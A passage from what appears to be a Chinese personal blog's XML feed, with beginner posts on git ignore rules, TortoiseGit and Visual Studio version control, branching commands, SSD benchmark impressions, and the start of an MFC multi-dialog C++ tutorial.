      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于git忽略文件</title>
      <link href="/2022/08/21/git-vs-tortoise/"/>
      <url>/2022/08/21/git-vs-tortoise/</url>
      
        <content type="html"><![CDATA[<p>本文简单介绍vs和tortoise git的忽略方式，水平一般有问题欢迎指出。</p><span id="more"></span><hr><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>目前也就会几种</p><ol><li>先从github的仓库create</li><li>vs利用git拓展</li><li>小乌龟git</li></ol><p>然后项目是cpp的，用的ide是vs，所以如果是别的项目或许关键点不一样<br><strong>关于为什么要忽略掉一些文件，按照惯例一般上传都是纯净的，你自己编译产生的exe、log和一些隐藏文件是别人不需要的，而且这些还占内存</strong></p><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="1-vs的忽略方式"><a href="#1-vs的忽略方式" class="headerlink" title="1. vs的忽略方式"></a>1. vs的忽略方式</h2><p>vs比较干脆吧，毕竟是图形化操作。</p><ol><li>首先在顶部菜单栏选择视图，打开git更改</li><li>然后你改动过的文件会在项目出现，你可以直接右击</li></ol><img src="/2022/08/21/git-vs-tortoise/000.png" class=""><p>忽略此本地项就是只忽略这个文件<br>忽略此拓展名，比如头文件的尾缀名是.h，那么所有的.h就被忽略了。</p><p>不过对于隐藏文件好像不太好显示，明确的话直接在第三种方式里面修改</p><blockquote><p>以我vs创建的项目为例，目录下都有个.vs的隐藏文件夹，这玩意体积大老大了，实际用处不大，然后除了手动添加了什么静态库之类的，再去掉debug和release目录，实际上的代码体积是很小的。</p></blockquote><p>你要是上传几个g到仓库，先不说速度，等会给ban了。</p><hr><h2 id="2-小乌龟git的忽略方式"><a href="#2-小乌龟git的忽略方式" class="headerlink" title="2. 小乌龟git的忽略方式"></a>2. 小乌龟git的忽略方式</h2><p>小乌龟的忽略方式同样是右击直接干，当然你再安装小乌龟的时候要给他添加到环境变量的，不然右键菜单里面不一定会有。</p><p>这个同样对于隐藏的文件好像不能主动忽略，除非你提交到仓库的时候给他忽略了，或者还是第三种就写好。</p><img src="/2022/08/21/git-vs-tortoise/001.png" class=""><p>虽然有的时候好像也会弹不出来。</p><p>可能提交的时候忽略会比较好使，但是我们知道的大类，是可以提前排除的最好，不然整个项目文件其实还是挺多的，检索一番也比较费时。</p><img src="/2022/08/21/git-vs-tortoise/002.png" class=""><hr><h2 id="3-gitignore文件"><a href="#3-gitignore文件" class="headerlink" title="3. .gitignore文件"></a>3. .gitignore文件</h2><p>这玩意就是核心点了，毕竟你图形化的操作也是变相的往里面编写。<br>github也有相应的介绍<a href="https://github.com/github/gitignore">戳此处</a><br>包括<a href="https://git-scm.com/book/en/v2/Git-Basics-Recording-Changes-to-the-Repository#_ignoring">如何忽略文件或目录</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># ignore all .a files</span><br><span class="line">*.a</span><br><span class="line"></span><br><span class="line"># but do track lib.a, even though you&#x27;re ignoring .a files above</span><br><span class="line">!lib.a</span><br><span class="line"></span><br><span class="line"># only ignore the TODO file in the current directory, not subdir/TODO</span><br><span class="line">/TODO</span><br><span class="line"></span><br><span class="line"># ignore all files in any directory named build</span><br><span class="line">build/</span><br><span class="line"></span><br><span class="line"># ignore doc/notes.txt, but not doc/server/arch.txt</span><br><span class="line">doc/*.txt</span><br><span class="line"></span><br><span class="line"># ignore all .pdf files in the doc/ directory and any of its subdirectories</span><br><span class="line">doc/**/*.pdf</span><br></pre></td></tr></table></figure><p>官方介绍的：<br>您可以放入<code>.gitignore</code>文件中的模式规则如下：</p><ul><li>空白行或以开头<code>#</code>的行将被忽略。</li><li>标准 glob 模式有效，并将在整个工作树中递归应用。</li><li>您可以使用正斜杠 <code>/</code> 开始模式以避免递归。</li><li>您可以使用正斜杠 <code>/</code> 结束模式以指定目录。</li><li>您可以通过以感叹号 <code>!</code> 开头来否定模式。</li></ul><blockquote><p>Glob 模式就像 shell 使用的简化正则表达式。星号 ( *) 匹配零个或多个字符；[abc]匹配括号内的任何字符（在本例中为 a、b 或 c）；问号 ( ?) 匹配单个字符；和括号括起由连字符 ( [0-9]) 分隔的字符，匹配它们之间的任何字符（在本例中为 0 到 9）。您还可以使用两个星号来匹配嵌套目录；a&#x2F;**&#x2F;z将匹配a&#x2F;z, a&#x2F;b&#x2F;z, a&#x2F;b&#x2F;c&#x2F;z, 等等。</p></blockquote><p>咱目前应该用这些就够了：</p><ul><li>以斜杠<code>/</code><ol><li>若斜杠在前，表示只忽略当前目录下这个名字的文件和目录，子目录不在范围</li><li>若斜杠在后，表示只忽略这个目录，不忽略这个名字的文件</li><li><code>!file/</code>这种做法等同于<code>file</code>，即忽略这个文件，不忽略这个名字的目录</li></ol></li><li>以星号<code>*</code>通配多个字符，比如<code>*.h</code></li><li>以问号<code>?</code>通配单个字符，这个不常用啊</li><li>以方括号<code>[]</code>包含单个字符的匹配列表<ol><li>例如<code>*.[hc]</code>，就是忽略掉所有的<code>.h</code>和<code>.c</code>文件，只要匹配到其中一个字符就成立</li></ol></li><li>以<code>.</code>开头的也就是隐藏文件或者目录，基本包含在内，比如vs生成的项目里就有个.vs的隐藏文件夹，可以直接用这个忽略掉。</li></ul><p>以叹号“!”表示不忽略(跟踪)匹配到的文件或目录；<br><strong>注意，gitignore偏向于解释型，匹配规则自上而下，前面已经匹配到了后面的就不会生效</strong><br><strong>添加忽略前上传的文件无法生效，只能clone下来删除后匹配忽略在上传</strong><br><strong>解释型语言好像都喜欢用#当注释</strong></p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>作为码农，git肯定还是要会用的。</p>]]></content>
      
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>没搞头的ssd跑分</title>
      <link href="/2022/08/20/ssdTest/"/>
      <url>/2022/08/20/ssdTest/</url>
      
        <content type="html"><![CDATA[<h1 id="随便测测反正娱乐"><a href="#随便测测反正娱乐" class="headerlink" title="随便测测反正娱乐"></a>随便测测反正娱乐</h1><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>主流两个软件</p><ul><li>AS SSD Benchmark</li><li>CrystalDiskMark</li></ul><p>但是u1s1前者的成绩比较渣，后者的还比较符合厂家给出的理论最大上限。</p><img src="/2022/08/20/ssdTest/asssd01.png" class=""><img src="/2022/08/20/ssdTest/cdm02.png" class=""><blockquote><p>以pm9a1来说，pice4.0*4，厂家给出的数据，<br>1tb的容量，r：7000mb&#x2F;s，w：5100mb&#x2F;s</p></blockquote><p>其实感觉也得考虑几个问题</p><ol><li>温度影响，简单安装的硬盘，也没搞铜片或者石墨烯，温度高了也有可能造成性能损耗</li><li>已有容量，感觉空盘切没分盘的时候可能效果最好</li><li>系统，win10和win11，win11感觉还是不完善。。win10也有点要搞事情的感觉</li><li>软件，就上面两个而言就能看出区别</li></ol><p>虽然我们也不得而知两个软件是靠什么得出这个数据，而且本身就是看一看。。实际感知到了一定程度并没有这么敏感。</p><p>搜了一下，有个说法挺有意思，但仅供参考<br>首先就是进制问题，硬盘厂家采用的是10进制啊，而计算机底层是二进制。<br>1tb 本来应该是 1024g，但是通过厂家的设计，变成了9xx多个g。<br>这也导致，这两个软件有一个要使用二进制去算成绩，肯定比十进制要低。</p><p>所以。。谁高谁低，谁用十进制谁用二进制或许可窥一斑</p><p>另一种4k对齐的说法和缓冲区，但是鬼晓得。。咱也不探讨这么深，就是说简单看看，不然到手看到as ssd的速度我都想退货了md。</p><p><strong>注意：不是专业的，仅为娱乐发言</strong></p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>所以实际上极值咱也别追求了，损耗能在5%-10%左右就很好了。虽然心理预期总归不舒服。<br>有异常，建议先搜这个硬盘型号，看看是否也有人遇到，除此之外如果是升级完系统突然掉速可回退，固件版本带来的影响目前没感受到。</p>]]></content>
      
      
      
        <tags>
            
            <tag> NoteBook </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【软件】小王八git版本控制工具</title>
      <link href="/2022/08/18/TortoiseGit/"/>
      <url>/2022/08/18/TortoiseGit/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>需要科学。</p><ul><li><a href="https://tortoisegit.org/download/">下载地址</a></li></ul><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><img src="/2022/08/18/TortoiseGit/000.png" class=""><p>一般都是选x64了，虽然也有不少应用还是这个x86，但是记得配套就行，上面是git本体，下面是语言包</p><p><strong>温馨提示，最好先下个git for windows，我因为早下了所以好像没提示</strong></p><hr><h2 id="vs配置"><a href="#vs配置" class="headerlink" title="vs配置"></a>vs配置</h2><p>然后就是visual studio的配置，一般也不做啥调整<br>打开工具-选项-源代码管理</p><img src="/2022/08/18/TortoiseGit/001.png" class=""><p>默认都是git，问题不大，自己看下是不是。</p><p>然后再工具那边打开源代码管理的几个按钮<br>右击顶栏很多按钮那一条，弹出这个，选中源代码管理即可</p><img src="/2022/08/18/TortoiseGit/002.png" class=""><p>选中之后，能看到多了一些，基础就大概这样了</p><img src="/2022/08/18/TortoiseGit/003.png" class=""><hr><h2 id="gitee-x2F-github创建仓库"><a href="#gitee-x2F-github创建仓库" class="headerlink" title="gitee&#x2F;github创建仓库"></a>gitee&#x2F;github创建仓库</h2><p>gitee嘛国内的不用科学，但是之前出了一档子破事好像都要审核了，我也没怎么用。<br>这里用的github，问题不大，懂得都懂。</p><p>简单介绍</p><img src="/2022/08/18/TortoiseGit/004.png" class=""><p>然后create之后就能看到</p><img src="/2022/08/18/TortoiseGit/005.png" class=""><blockquote><p>没必要去翻我的哈。。自己学习用的</p></blockquote><p>那么仓库建好了，就要用源代码管理工具去操作了。</p><p>首先看仓库的code按钮</p><img src="/2022/08/18/TortoiseGit/006.png" class=""><p>有三种clone方式，第一种https，这个应该不陌生的吧大部分人，就是web协议，http的基础上加入ssl证书验证。第二种比较常用，ssh，为啥这么说呢。。之前瞎搞linux的时候，就常用就是直接clone到文件夹，然后去执行.&#x2F;install.sh脚本哈哈哈。第三种带了个cli，估计就是client，github的客户端了应该是。</p><p>小乌龟添加的方式差不多也用ssh，所以copy这个ssh给的链接。<br>然后找个地方建个空的文件夹，因为要clone进去，文件夹的名字和仓库名倒是没要求要一样，我这是为了好区分。</p><img src="/2022/08/18/TortoiseGit/007.png" class=""><p>然后在此处右击</p><img src="/2022/08/18/TortoiseGit/008.png" class=""><p>点击这个克隆</p><img src="/2022/08/18/TortoiseGit/009.png" class=""><p>我们把url填入其中</p><img src="/2022/08/18/TortoiseGit/010.png" class=""><p>github复制的url不需要做什么改动，除此之外小微调一下</p><img src="/2022/08/18/TortoiseGit/011.png" class=""><img src="/2022/08/18/TortoiseGit/012.png" class=""><p>然后点击是的时候大概率会报错，<code>server sent :publickey</code>，大致意思就是你没有设置publickey，我是用hexo搭博客上传到github的，用的就是git的客户端。自然是设置过这个publickey的</p><p>首先打开tortoisegit的settings，找到网络，看下面的ssh客户端，原先那个我懒得再配一个给github了，反正我git用的多，直接用git的ssh就行了。<br><strong>如果你没有用过git for windows，那么我推荐你去下一个！</strong></p><blockquote><p>操作也不难，我学过linux，一般都是用git bash。<br>请前往我创建博客的文章，找到在用户目录下打开.ssh和用git bash设置github用户名+创建邮箱那几个地方。<br>如若不然，只得您自行寻找给小乌龟git的ssh客户端新建一个sshkey的凭证</p></blockquote><img src="/2022/08/18/TortoiseGit/014.png" class=""><p>设置完成后，重新clone。</p><img src="/2022/08/18/TortoiseGit/013.png" class=""><p>就没问题了，文件也clone到本地磁盘了。</p><img src="/2022/08/18/TortoiseGit/015.png" class=""><p>打开也没啥，就一个readme.md的自述文件，<code>.git</code>是隐藏文件，主要还是记录了git的信息。</p><hr><h3 id="日志信息"><a href="#日志信息" class="headerlink" title="日志信息"></a>日志信息</h3><p>右击这个clone的文件夹</p><img src="/2022/08/18/TortoiseGit/016.png" class=""><p>在旁边能找到显示日志信息的选项打开</p><img src="/2022/08/18/TortoiseGit/017.png" class=""><p>信息可以说还是很全面的。</p><p>日志可以很好的看出代码的改动，是谁改的，什么时候改的。而且防止删除源代码，在你不是这个库的创建者下，无权删除整个仓库，你顶多删掉你更新的那一块，不至于让整个项目从零开始。</p><hr><h3 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h3><p>在github创建的时候仓库就是空的，除了一个自述文件。<br>那么最开始就配置的vs不能浪费，通过vs创建项目，然后上传一举多得。</p><img src="/2022/08/18/TortoiseGit/018.png" class=""><p><strong>注意路径是你之前clone的项目路径</strong></p><img src="/2022/08/18/TortoiseGit/019.png" class=""><p>然后这里把MFC标头勾选，点击确定项目就创建好了。</p><img src="/2022/08/18/TortoiseGit/020.png" class=""><p>创建好保存一下，先关闭vs。<br>然后转到文件夹，会看到我们这个新建的项目文件前面没有绿色的勾。<br>其实也就是因为他还没上传到仓库。</p><img src="/2022/08/18/TortoiseGit/021.png" class=""><p>右击这个文件选择提交到-&gt;</p><img src="/2022/08/18/TortoiseGit/022.png" class=""><p>大致跟着来，但是注意，不要全选文件上传，有个文件是没啥价值的。</p><blockquote><p>.vs目录是用来存储当前用户在解决方案中的工作配置，具体包括VS关闭前最后的窗口布局、最后打开的选项卡&#x2F;操作记录&#x2F;文件文档、某些自定义配置&#x2F;开发环境、调试断点等这类设置信息和状态。直接删掉没有任何问题。<br>相当于说每台电脑生成项目的时候这个.vs都不一样，所以没有必要上传他，而且这个文件很占内存。</p></blockquote><p>我们可以右击手动设置忽略掉这个文件夹</p><img src="/2022/08/18/TortoiseGit/023.png" class=""><img src="/2022/08/18/TortoiseGit/024.png" class=""><p>注意不要收养选递归，不然有的时候出现重名啥的会被直接忽略。</p><p>除了这个<code>.vs</code>文件夹，还有一个文件也是不大需要的，</p><img src="/2022/08/18/TortoiseGit/025.png" class=""><p>可以看到是user，就是用户，那么每个用户生成的肯定也不一样。</p><img src="/2022/08/18/TortoiseGit/026.png" class=""><p>这个也不需要，忽略掉</p><hr><h2 id="小乌龟提交和推送"><a href="#小乌龟提交和推送" class="headerlink" title="小乌龟提交和推送"></a>小乌龟提交和推送</h2><img src="/2022/08/18/TortoiseGit/027.png" class=""><p>当你点击提交的时候，他还没有直接上传到仓库，而是生成缓存，只有点击推送了才是真的上传到仓库。</p><img src="/2022/08/18/TortoiseGit/028.png" class=""><p>做这些分层的工作，自然是为了更加安全的，有意义的，符合逻辑的上传。因为改多了突然一激灵想到那有问题，就可以重新来了。</p><img src="/2022/08/18/TortoiseGit/029.png" class=""><p>点击推送，就完事了。</p><img src="/2022/08/18/TortoiseGit/030.png" class=""><p>推送完成后能看到这个项目文件夹也多了绿色勾选。</p><p>亦可以通过日志，看到我们的更改信息</p><img src="/2022/08/18/TortoiseGit/031.png" class=""><p>vs重新打开的时候其实也能看到</p><img src="/2022/08/18/TortoiseGit/032.png" class=""><hr><h2 id="vs提交和推送"><a href="#vs提交和推送" class="headerlink" title="vs提交和推送"></a>vs提交和推送</h2><p>有一点是我们创建项目没有做的，就是生成解决方案<br>因为这个是我们编译后的产物，别人只需要拿到源码自己编译就行了。</p><p>所以我们在vs中先生成解决方案，然后到文件夹里面挨个忽略掉</p><img src="/2022/08/18/TortoiseGit/033.png" class=""><p>这里多个x64是手残了，没把项目的x64改成x86，老实说一般都还是x86比较多。</p><p>除了外面的debug文件夹，两个项目里面都有debug和x64，需要手动忽略，方法跟之前的一样。</p><img src="/2022/08/18/TortoiseGit/034.png" class=""><p>回过头来，当vs这些文件都出现蓝色的锁，就表示它们已经上传到仓库了。<br>当我们修改过其中一个地方，这个文件的蓝色锁就变成红色了。</p><img src="/2022/08/18/TortoiseGit/035.png" class=""><p>当有文件改动的时候，git插件就要干活了</p><img src="/2022/08/18/TortoiseGit/036.png" class=""><p>能看到多了一个提交和撤销。</p><p>这里选提交，点击全部暂存，看到.sln记得忽略掉。</p><img src="/2022/08/18/TortoiseGit/039.png" class=""><p>然后就是点击全部提交，会显示一个本地创建</p><img src="/2022/08/18/TortoiseGit/037.png" class=""><p>完成之后点击同步，然后再点击旁边的推送。</p><img src="/2022/08/18/TortoiseGit/040.png" class=""><p>最后也可以在日志中看到我们这次通过vs的提交</p><img src="/2022/08/18/TortoiseGit/038.png" class=""><p>其次在输出里面切换到git，我们也能看到流程</p><img src="/2022/08/18/TortoiseGit/041.png" class=""><p>此外github的仓库自然也能看到推送的情况</p><img src="/2022/08/18/TortoiseGit/042.png" class=""><hr><h2 id="分支"><a href="#分支" class="headerlink" title="分支"></a>分支</h2><p>我们目前的操作，都是推送给main分支，也就是覆盖性的操作。<br>当然如果每次都覆盖，有一天新版本挂了想要恢复到某一结点就是不可能的事了。</p><p>所以仓库还有一个分支的选项。</p><img src="/2022/08/18/TortoiseGit/043.png" class=""><p>可以通过git更改的页，去选中那三个点，然后选择创建分支</p><p>显然分支的存在带来了很大的便捷性，毕竟一个项目会衍生出不同的情况，在许多个方案之间反复横跳，我们就可以通过分支去跟着横跳达到需求。</p><p>用vs切换分支不难，直接在git更改里面，这个框选里面选择就行</p><img src="/2022/08/18/TortoiseGit/045.png" class=""><p>还有就是命令行的情况，因为装了git for windows，所以有个git bash的产物，都是以linux命令行的形式玩的挺好用的。</p><img src="/2022/08/18/TortoiseGit/044.png" class=""><p>首先就是查看分支，和切换分支，不过分支是啥其实路径都明明白白了。</p><p>然后我们修改分支，在代码里加一句注释，等会上传完切换分支看看效果</p><img src="/2022/08/18/TortoiseGit/046.png" class=""><p>在github里面很自然的看出了两个分支，而新增的分支，多了一个我们刚才上传的localtest。</p><img src="/2022/08/18/TortoiseGit/047.png" class=""><img src="/2022/08/18/TortoiseGit/048.png" class=""><p>ok，重点时刻</p><img src="/2022/08/18/TortoiseGit/049.png" class=""><p>当我们在vs的git更改里面，签回main分支，会发现那句注释不见了。<br>切回到local_branch的时候注释又出来了</p><img src="/2022/08/18/TortoiseGit/050.png" class=""><p>这就是分支的力量。</p><p><strong>默认情况下创建的仓库，主分支一般都叫main或者master，目前新仓库的默认主分支都叫main了，老的可能还是master，具体原因可以百度好像是master这个词多义性。而主分支只有在新分支开发的功能完全ok的情况下才会合并一次，直接在主分支上操作的风险略高，且不利于团队发现问题。而且大部分情况下，功能也不会只有一个，多个人同时写尽量都创建分支</strong></p><p>附：百度来的一些分支命名</p><ol><li>git主分支(master)。它是自动建立，用于发布重大版本更新。</li><li>git开发主分支(develop)。日常开发在此分支上进行。</li><li>git临时性分支：主要是应对日常开发中的遇到的版本问题的。<ol><li>功能（feature）分支：它是为了开发某种特定功能，从Develop分支上面分出来的。开发完成后，要再并入Develop。可以采用feature-*的形式命名。</li><li>预发布（release）分支：指发布正式版本之前（即合并到Master分支之前），我们可能需要有一个预发布的版本进行测试。预发布分支是从Develop分支上面分出来的，预发布结束以后，必须合并进Develop和Master分支。它的命名，可以采用release-*的形式。</li><li>修补bug（hotfix）分支：软件正式发布以后，难免会出现bug。这时就需要创建一个分支，进行bug修补。修补bug分支是从Master分支上面分出来的。修补结束以后，再合并进Master和Develop分支。它的命名，可以采用hotfix-*的</li></ol></li></ol><p>用git bash操作也差不多的。无非就是图形化和命令行</p><img src="/2022/08/18/TortoiseGit/051.png" class=""><img src="/2022/08/18/TortoiseGit/052.png" class=""><p>这里提示了一下，因为我改动了哈哈</p><p>附：git的命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查看分支列表</span></span><br><span class="line">git branch</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建新分支</span></span><br><span class="line">git branch 新分支名称</span><br><span class="line"></span><br><span class="line"><span class="comment">#切换分支</span></span><br><span class="line">git checkout 分支名称</span><br><span class="line"></span><br><span class="line"><span class="comment">#快速创建分支并切换</span></span><br><span class="line">git checkout -b 分支名称</span><br><span class="line"></span><br><span class="line"><span class="comment">#合并分支的时候，若目前在c分支，先切换到要合并的分支git checkout name，然后合并</span></span><br><span class="line">git merge c</span><br><span class="line"></span><br><span class="line"><span class="comment">#删除分支</span></span><br><span class="line">git branch -d 分支名称</span><br><span class="line"></span><br><span class="line"><span class="comment">#合并冲突还不是很理解，先空着</span></span><br></pre></td></tr></table></figure><hr><h2 id="项目分析"><a href="#项目分析" class="headerlink" title="项目分析"></a>项目分析</h2><ul><li>需求分析<ul><li>市场需求</li><li>估值</li></ul></li><li>技术分析<ul><li>技术栈涉及多少</li><li>时效</li></ul></li></ul><p>反正要考虑的挺多的，一个项目能不能立项要看需求，但是有的时候有需求没有用，没有资金筹备，项目上不了线，终归是胎死腹中。</p><p>还有感人的产品锦鲤，毕竟需求不可能是固定的。</p><hr><h2 id="附：git命令行操作"><a href="#附：git命令行操作" class="headerlink" title="附：git命令行操作"></a>附：git命令行操作</h2><p>网上copy的也就看看先，具体要用到哪些还不确定：</p><h3 id="一、-创建test分支提交步骤"><a href="#一、-创建test分支提交步骤" class="headerlink" title="一、 创建test分支提交步骤"></a>一、 创建test分支提交步骤</h3><ol><li><p>列出所有分支</p><blockquote><p>git branch -a</p></blockquote></li><li><p>创建test分支</p><blockquote><p>git branch test</p></blockquote></li><li><p>切换到test分支:</p><blockquote><p>git checkout test</p></blockquote></li><li><p>添加add修改:</p><blockquote><p>git add .</p></blockquote></li><li><p>添加commit注释</p><blockquote><p>git commit -m “第一次提交代码”</p></blockquote></li><li><p>提交到服务器</p><blockquote><p>git push origin test</p></blockquote></li></ol><h3 id="二、将test分支合并到master本地分支"><a href="#二、将test分支合并到master本地分支" class="headerlink" title="二、将test分支合并到master本地分支"></a>二、将test分支合并到master本地分支</h3><ol><li><p>创建test分支</p><blockquote><p>git branch test</p></blockquote></li><li><p>切换到test分支</p><blockquote><p>git checkout test</p></blockquote></li><li><p>在test分支添加一个readme.txt文件</p><blockquote><p>touch readme.txt<br>git add readme.txt</p></blockquote></li><li><p>提交commit本地文件</p><blockquote><p>git commit -m “增加readme.txt”</p></blockquote></li><li><p>切换到master分支</p><blockquote><p>git checkout master</p></blockquote></li><li><p>把test分支合并到master分支</p><blockquote><p>git merge test</p></blockquote></li><li><p>提交master分支到服务器</p><blockquote><p>git push origin master</p></blockquote></li><li><p>删除test分支</p><blockquote><p>git branch -d test</p></blockquote></li></ol><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>未完结~待续</p>]]></content>
      
      
      <categories>
          
          <category> software </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>多个对话框关联</title>
      <link href="/2022/08/03/nDialog/"/>
      <url>/2022/08/03/nDialog/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>倒也没啥特别，效果是类似于一个问卷调查。</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>直接在前面项目上改动了</p><img src="/2022/08/03/nDialog/000.png" class=""><p>点击这个按钮，自然是弹出新的对话框，所以要新建资源<br>右击资源视图中该项目的Dialog，选择添加资源</p><img src="/2022/08/03/nDialog/001.png" class=""><p>这个对话框类型后面仨就是大小之间有差异。</p><p>然后就是拖控件，其中这些radio单选框啥啥啥的，以前html做表单的时候用的感觉都差不多吧，不算太陌生。</p><img src="/2022/08/03/nDialog/002.png" class=""><p>样式完成之后要新建类和这个对话框关联</p><img src="/2022/08/03/nDialog/003.png" class=""><p><strong>这里要注意命名的时候要和Dialog里的一样，只不过我这个vs2022对话框id不知道为啥没显示，正常应该是会根据类名在前面加上IDD_，这也是为什么上面创建类名是这个样，但好在源文件头文件是随便的</strong></p><img src="/2022/08/03/nDialog/004.png" class=""><p>创建完之后可以看到类向导这里这个类关联的资源就是刚才新建的对话框</p><p>类和对话框关联之后，就要给这些控件添加变量。</p><p>单选框的特性就是只能选中一个，那么这个变量首先为值类型，其次类型为BOOL。创建三个又太麻烦，所以新建一个之后直接改成数组</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="comment">// 单选框的值</span></span><br><span class="line">BOOL m_lang[<span class="number">3</span>];</span><br></pre></td></tr></table></figure><p>在源文件中自然免不了修改了</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// PROP01.cpp: 实现文件</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;RunningButton.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;afxdialogex.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;PROP01.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// PROP_01 对话框</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">IMPLEMENT_DYNAMIC</span>(PROP_01, CPropertyPage)</span><br><span class="line"></span><br><span class="line">PROP_01::<span class="built_in">PROP_01</span>()</span><br><span class="line">: <span class="built_in">CPropertyPage</span>(IDD_PROP_01)&#123;</span><br><span class="line"><span class="built_in">memset</span>(m_lang, <span class="number">0</span>, <span class="built_in">sizeof</span>(m_lang));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PROP_01::~<span class="built_in">PROP_01</span>()&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PROP_01::DoDataExchange</span><span class="params">(CDataExchange* pDX)</span></span>&#123;</span><br><span class="line">CPropertyPage::<span class="built_in">DoDataExchange</span>(pDX);</span><br><span class="line"><span class="built_in">DDX_Radio</span>(pDX, IDC_RADIO_CPP, m_lang[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">DDX_Radio</span>(pDX, IDC_RADIO_JAVA, m_lang[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">DDX_Radio</span>(pDX, IDC_RADIO_PYTHON, m_lang[<span class="number">2</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">BEGIN_MESSAGE_MAP</span>(PROP_01, CPropertyPage)</span><br><span class="line"><span class="built_in">END_MESSAGE_MAP</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// PROP_01 消息处理程序</span></span><br></pre></td></tr></table></figure><p>在c&#x2F;c++中布尔值本质就是0和1的表示，虽然TRUE真意是非0的值。<br><code>memset(m_lang, 0, sizeof(m_lang));</code>那么初始化的时候直接给这个数组全部写0，也就是表示FALSE，完成初始化的操作。</p><p>至于<code>DDX_Radio(pDX, IDC_RADIO_CPP, m_lang[0]);</code>，就可以通过数组依次绑定。</p><img src="/2022/08/03/nDialog/005.png" class=""><p>这个里面应是得有几个公司的名字才对，由于这个类是我们新建的，还没有初始化的地方。<br>所以要重写InitDialog</p><p>老样子类视图选中然后属性里面找到重写选项，往下滑找到<code>OnInitDialog</code>，点击后面add即可。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">PROP_01::OnInitDialog</span><span class="params">()</span></span>&#123;</span><br><span class="line">CPropertyPage::<span class="built_in">OnInitDialog</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span>  在此添加额外的初始化</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span 